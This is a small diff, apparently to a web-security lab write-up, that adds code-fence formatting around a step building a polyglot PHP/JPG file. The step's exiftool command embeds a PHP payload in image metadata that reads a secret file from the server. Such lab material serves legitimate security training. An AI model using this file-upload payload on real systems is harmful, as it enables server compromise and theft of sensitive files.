@@ -12,5 +12,6 @@
 ```
 
 2. Create a polyglot PHP/JPG with PHP payload in its metadata
-
+```shell
 exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" <YOUR-INPUT-IMAGE>.jpg -o polyglot.php
+```
